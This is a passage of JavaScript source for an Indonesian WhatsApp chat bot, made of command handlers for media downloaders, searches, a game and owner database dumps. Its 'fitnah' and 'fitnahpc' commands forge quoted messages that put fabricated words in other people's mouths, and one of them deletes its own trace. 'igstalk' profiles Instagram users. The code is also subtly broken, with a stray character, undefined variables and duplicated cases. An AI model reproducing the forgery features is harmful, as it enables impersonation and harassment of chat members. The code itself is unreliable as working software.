		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 10000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
		                         captions = `*PLAY*\n\n*Title* : ${title}\n\n_Silahkan pilih file media yang di download_`
							 let vvisaioa = await getBuffer(thumb)
							     vud0woi2d = await client.prepareMessage(from, vvisaioa, MessageType.location, {thumbnail: vvisaioa})
			 let vud0woid = vud0woi2d.message["ephemeralMessage"] ? vud0woi2d.message.ephemeralMessage : vud0woi2d
const buttonvido = [
  {buttonId: `ytmp3 ${srch}`, buttonText: {displayText: 'AUDIO'}, type: 1},
  {buttonId: `video ${srch}`, buttonText: {displayText: 'VIDEO'}, type: 1},
]

const buttonMessagegacvudeia = {
    contentText: captions,
    footerText:support,
    buttons: buttonvido,
    headerType: 6, 
	locationMessage: vud0woid.message.locationMessage
}
client.sendMessage(from, buttonMessagegacvudeia, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
		                        })                
		                        })
		                        } catch (err) {
		                        replysticker(errorstc)
		                        }
							await confirmLIMIT(sender, [angka]) 
		                   break    

client.sendMessage(from, buttonMessagegachaceca, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break		
	case 'ytmp3':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
						if (!q) return reply(`Kirim perintah *${prefix+command} [linkYt]*`)
					 if (!isUrl(args[0]) && !args[0].includes('youtu')) return replysticker(errorstc)
						try {
							replysticker(waitstc)
							yta(args[0])
							.then((res) => {
								const { dl_link, thumb, title, filesizeF, filesize } = res
								axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
								.then((a) => {
								if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ *YTmp3*\n\n❏ *Title* : ${title}\n❏ *Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
								sendFileFromUrl(dl_link, document, {mimetype: 'audio/mp3', filename: `${title}.mp3`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:" YTMP3",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() =>  replysticker(errorstc))
							})
					        })
						} catch (err) {
							 replysticker(errorstc)
						}
						await confirmLIMIT(sender, [angka]) 
						break
case 'ytmp4':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
						if (!q) return reply(`Kirim perintah *${prefix+command} [linkYt]*`)
					 if (!isUrl(args[0]) && !args[0].includes('youtu')) return replysticker(errorstc)
							replysticker(errorstc)
						await confirmLIMIT(sender, [angka]) 
						break						
			case 'ytsearch':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
		if (!q) return reply(`Kirim teks dengan caption ${prefix+command}Tolong masukan query!`)
					var srch = args.join('');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await client.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '❏ Title: ' + video.title + '\n'
		            ytresult += '❏ Link: ' + video.url + '\n'
		            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
		            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += `◩ *${fake}*`
sendButtonImageLoc(from, ytresult, support, buttonsmenu2, { quoted: fdoc,contextInfo:{mentionedJid: [player, numbernye, ow, dev]}} ) 
					await confirmLIMIT(sender, [angka]) 
					break
case 'brainly':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
		if (!q) return reply(`Kirim teks dengan caption ${prefix+command} Pertanyaan apa`)
		          	brien = args.join(' ')
					brainly(`${brien}`).then(res => {
					teks = '❉───────────────────────❉\n'
					for (let Y of res.data) {
					teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
					}
					client.sendMessage(from, teks, text,{quoted:mek,detectLinks: false}).catch(() =>replysticker(errorstc))                       
		            })  
await confirmLIMIT(sender, [angka]) 					
break		
					
		    case 'igstalk':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
					if (!q) return reply(`Kirim teks dengan caption ${prefix+command} Usernamenya`)
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks).catch(() =>replysticker(errorstc))  
		            })     
await confirmLIMIT(sender, [angka]) 					
		            break 
case 'fitnah':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target3 = gh.split("|")[1];
            var bot = gh.split("|")[2];
            client.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target3}` }}})
            break
    case 'settarget':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${ow}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await client.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await client.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
 case 'get':
case 'fetch':

if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break	  

 
    case 'join':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!qodeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await client.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
  case 'caripesan':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q)return reply('pesannya apa bang?')
            let v = await client.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await client.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
			case 'adventure':
			   case 'traveling':
              
if (!isRegistered) return sendButtonNotRegis(from)
				if (isBanned) return reply(ind.baned())
					if (!isOwner) return replysticker(ownerstc)
				if ( checkHealuser(sender) <= 15) return reply(ind.healend())
				if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
				setTimeout( () => {
                    reply(`\`\`\`START ADVENTURE\`\`\``)
                    }, 1000)
                      addLevelingXp(sender, getexp)
					  addKoinUser(sender, getmoney)
					  addPotionUser(sender, count1)
					  addMegaPotionUser(sender, count2)
					  addDaun1User(sender, count7)
					  addDaun2User(sender, count8)
					  addPuzzleUser(sender, count13)
					  addBibitUser(sender, count14)
uhuhggf = `
       *「 DEATH 」*
┃➣ *ADVENTURE END*
┃➣ *Traveler:@${player.split("@")[0]}*
┃➣ *Money   :Rp.${getmoney}*
┃➣ *Exp     :${getexp}Xp*
┃➣ *GATHERING ITEM*
┃➣ *💉:${count1}* ➣ *💊:${count2}* 
┃➣ *🍂:${count7}* ➣ *🌿:${count8}*
┃➣ *🧩:${count13}* ➣ *🌱:${count14}*
╰━━━━━━━━━━━━━━━━━
\`\`\`Note\`\`\`
\`\`\`Item yang didapatkan bisa kamu liat ${prefix}ransel\nJangan lupa jual barang yang kalian temukan di ${prefix}shopmenu\`\`\`
`
					setTimeout( () => {
sendButtonRPGLoc(from, uhuhggf, support, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}, 10000)	
					await confirmLIMIT(sender, 5)
					await confirmHEAL(sender, 15)
					break
			
case 'getdb':
	if (!isOwner) return replysticker(ownerstc)
fs.readFileSync('./database/bot/registered.json')
client.sendMessage(from, fs.readFileSync('./database/bot/registered.json'), document, {mimetype: 'application/octet-stream', filename:`registered.json`})  
break
case 'changedb':
	if (!isOwner) return replysticker(ownerstc)
client.sendMessage(from, fs.readFileSync('./database/bot/registered.json'), document, {mimetype: 'application/octet-stream', filename:`registered.json`})  
break

			  	case 'level':
                if (!isRegistered) return sendButtonNotRegis(from)
				if (isBanned) return reply(ind.baned())
                if (!isGroup) return reply(ind.groupo())
				if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
                const userLevel = getLevelingLevel(sender)
                const userXp = getLevelingXp(sender)
                if (userLevel === undefined && userXp === undefined) return reply(ind.lvlnul())
                const requiredXp = 5000 * (Math.pow(2, userLevel) - 1)
                resul = `\`\`\` 「 LEVEL 」 \`\`\`\n➣ \`\`\` Nama\`\`\`  : ${pushname}\n➣ \`\`\` Nomor\`\`\`  : ${sender.split("@")[0]}\n➣ \`\`\` Role\`\`\`  : ${role}\n➣ \`\`\` User XP\`\`\`  :  ${userXp}/${requiredXp}\n➣ \`\`\` User Level\`\`\`  : ${userLevel}`
               client.sendMessage(from, resul, text, { quoted: mek})
                .catch(async (err) => {
                        console.error(err)
                        await reply(`Error!\n${err}`)
                    })
				break 	
/*
]=====> GROUP MENU<=====[
*/
case 'hxcecan':
case 'hxcogan':
case 'hxhusbu':
case 'hxwaifu':
case 'hxcat':
case 'hxdog':
case 'hxbird':
case 'hxfox':
case 'hxpanda':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
await replysticker(loadingstc)
			let gacha = await hx.pinterest(`${command.slice(2)}`)
            let gachaa = gacha[Math.floor(Math.random() * gacha.length)]
            let gacharandom = await getBuffer(gachaa)
               gachawa12 = await client.prepareMessage(from, gacharandom, MessageType.image, {thumbnail: Buffer.alloc(0)})
			   let gachawa = gachawa12.message["ephemeralMessage"] ? gachawa12.message.ephemeralMessage : gachawa12
const buttonsgachas= [
  {buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1},
]

const buttonMessagegachaceca = {
    contentText: `Jeda 5 Detik`,
    footerText: `*Support Nekopoi.Care*\n*Offical Bot By @${numbernye.split("@")[0]}*\n*Powered By @${ow.split("@")[0]}*`,
    buttons: buttonsgachas,
    headerType: 4, 
	imageMessage: gachawa.message.imageMessage
}

client.sendMessage(from, buttonMessagegachaceca, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
				break
				
case 'hxlirik':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break

 case 'hxtwitter':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await hx.twitter(`${ten}`)
            ren = `${g.HD}`
            sendMediaURL(from,ren,'DONE')
            break
case 'hxsurah':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Example :\n${prefix}surah 1`)
hx.surah(q).then(res => {
teks = '```「 AL-QURAN 」```\n\n_Lebih baik baca di al-qurannya langsung biar berkah, kalo dihp gk berkah_\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}f
reply(teks)
})
await confirmLIMIT(sender, [angka]) 
break
case 'hxtiktokaudio':  
if (!isRegistered) return sendButtonNotRegis(from)
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.api)
 		if (!q) return reply('Linknya?')
 		replysticker(waitstc)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
    nowmm = await getBuffer(audio)
	client.sendMessage(from,nowmm ,MessageType.audio,{mimetype:'audio/mp4',quoted: mek})
		})
		})
		break 
		case 'hxttmp4':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
hx.ttdownloader(lin).then(res => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
case 'hxttmp3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.nowm
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
client.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'luc.mp3', ptt:true})
})
break
case 'hxttmpwm3':
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
if (args.length < 1) return reply('Link?')
lin = args[0]
hx.ttdownloader(lin).then(async (res) => {
console.log('[ TIKTOK ] downloader')
anu = res.wm
fto = WMthumb
client.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail: Buffer.alloc(0), contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
client.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'luc.mp3', ptt:true})
})
break
	case 'hxigstory': 
if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply('Usernamenya?')
            hx.igstory(`${q}`)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'hxplaystore':
    
if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(`${q}`)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 *PLAY STORE* 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
		    case 'hxfb':
		
if (!isRegistered) return sendButtonNotRegis(from)
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.error.api)
            replysticker(waitstc)
            te = args.join(' ')
            hx.fbdown(`${te}`)
            .then(G => {
            ten = `${G.HD}`
            sendMediaURL(from,ten,`*LINK VIDEO* : ${G.Normal_video}`)
            })
            break    
case 'hxlinkwa':
case 'hxgrupwa':
case 'hxgroupwa':
case 'hxgcwa':

if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply('cari group apa?')
            hx.linkwa(`${q}`)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
    case 'hxotaku':
    
if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(`${q}`)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            client.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case'hxkomiku':
    
if (!isRegistered) return sendButtonNotRegis(from)
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(`${q}`)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break  
		    case 'hxtwmp4': 
			case 'hxtwitter':
		
if (!isRegistered) return sendButtonNotRegis(from)
if (args.length < 1) return reply('Link?')
lin = args[0]
replysticker(waitstc)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = fs.readFileSync('./logonya.jpeg')
sendMediaURL(from, Anu, 'Done!')
})
break
case 'hxtwmp3':
		
if (!isRegistered) return sendButtonNotRegis(from)
if (args.length < 1) return reply('Link?')
lin = args[0]
replysticker(waitstc)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
khs = await getBuffer(Anu)
client.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'audio.mp3', quoted:mek, ptt:true})
})
break
 case 'hxgdown':
	case 'ig':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
	    hx.igdl(args[0])
	    .then(async(result) => {
            for(let i of result.media){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
	    break  
			 case 'hxpinterest':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await client.sendMessage(from,di,image,{quoted: mek, thumbnail: Buffer.alloc(0)})
            break
			 case 'hxchara':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li13 = await getBuffer(acak)
            await client.sendMessage(from,li,image,{quoted: mek, thumbnail: Buffer.alloc(0)})
            break

case 'ig':
case 'igdl':
case 'instagram':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} [link instagram]`)
 if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return replysticker(errorstc)
var { igDownloader } = require('./lib/bot/igdown')
   res = await igDownloader(`${q}`).catch(e => {
replysticker(errorstc)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
await confirmLIMIT(sender, [angka]) 	
                    break
case 'tiktok':
case 'tiktokdl':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} [link instagram]`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return replysticker(errorstc)
replysticker(waitstc)
setTimeout( () => {
sendButtonText(from, `_Pilih Tipe Di Bawah Ini_`, support, [{buttonId: `tiktoknowm ${q}`,buttonText: {displayText: `NOWM`}, type: 1},{buttonId: `tiktokwm ${q}`,buttonText: {displayText: `WM`}, type: 1},{buttonId: `tiktokaudio ${q}`,buttonText: {displayText: `AUDIO`}, type: 1}], { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
}, 2000)
await confirmLIMIT(sender, [angka]) 	
break
case 'tiktoknowm':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} [link instagram]`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return replysticker(errorstc)
var { TiktokDownloader } = require('./lib/bot/tiktokdl')
replysticker(waitstc)
res = await TiktokDownloader(`${q}`).catch(e => {
replysticker(errorstc)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
await confirmLIMIT(sender, [angka])	
break
case 'tiktokwm':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} [link instagram]`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return replysticker(errorstc)
var { TiktokDownloader } = require('./lib/bot/tiktokdl')
replysticker(waitstc)
res = await TiktokDownloader(`${q}`).catch(e => {
replysticker(errorstc)
})
console.log(res)
sendMediaURL(from, `${res.result.watermark}`)
await confirmLIMIT(sender, [angka])	
break
case 'tiktokaudio':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} [link instagram]`)
 if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return replysticker(errorstc)
var { TiktokDownloader } = require('./lib/bot/tiktokdl')
replysticker(waitstc)
res = await TiktokDownloader(`${q}`).catch(e => {
replysticker(errorstc)
})
console.log(res)
sendMediaURL(from, `${res.result.watermark}`, audio, {mimetype: 'audio/mp4'})
await confirmLIMIT(sender, [angka])	
break
case 'pinterest':
case 'pin':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} gambar yang ingin dicari`)
replysticker(waitstc)
pint = await pinterest(q)
{
  let imagenya = pint[Math.floor(Math.random() * pint.length)]
            let pinn = await getBuffer(imagenya)
               pinna = await client.prepareMessage(from, pinn, MessageType.image, {thumbnail: Buffer.alloc(0)})
			   let pinnapi = pinna.message["ephemeralMessage"] ? pinna.message.ephemeralMessage : pinna
const buttons = [
  {buttonId: `pinterest ${q}`, buttonText: {displayText: 'Next'}, type: 1},
]

const buttonMessage = {
    contentText: `${hahh}`,
    footerText: support,
    buttons: buttons,
    headerType: 4, 
	imageMessage: pinnapi.message.imageMessage
}

client.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek, contextInfo :{sendEphemeral: true, mentionedJid: [numbernye, dev, ow]}})
await confirmLIMIT(sender, [angka])
}
break
case 'getcaption':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from)
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
  case 'get':
case 'fetch':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
            if(!q) return reply('Linknya?')
            fetch(q).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
case 'gimage':
case 'googleimage':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} gambar yang ingin dicari`)
replysticker(waitstc)
res = await googleImage(q, google)
function google(error, result){
if (error){ return reply('_[ ! ] Error Terclienti Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: mek, caption: `*Hasil Pencarian Dari :* ${q}`})
}}
break
case 'herolist':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (!q) return reply(`Kirim teks dengan caption ${prefix+command} hero ml`)
res = await herodetails(q)
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'google':
case 'googlesearch':
case 'ggs':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
	if (!q) return reply(`Kirim teks dengan caption ${prefix+command}Yang mau di cari apaan`)
teks = args.join(' ')
replysticker(waitstc)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
	if (!q) return reply(`Kirim teks dengan caption ${prefix+command}Yang mau di cari apaan`)
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendFileFromUrl(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
	if (!q) return reply(`Kirim teks dengan caption ${prefix+command} link`)
if (!isRegistered) return sendButtonNotRegis(from)
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)

replysticker(waitstc)
res = await mediafireDl(q)
result = `*「 MEDIAFIRE DOWNLOAD 」*

*Data Berhasil Didapatkan!*
\`\`\` Nama : ${res[0].nama}\`\`\`
\`\`\` Ukuran : ${res[0].size}\`\`\`
\`\`\` Link : ${res[0].link}\`\`\`

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
				case 'translate':
				case 'ts':

if (!isRegistered) return sendButtonNotRegis(from)
					try{
					if ( args.length === 1 ){
						tekss = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
						translate(tekss, {client: 'gtx', to:args[0]})
						.then((res) =>{
							reply(res.text)
							}) 
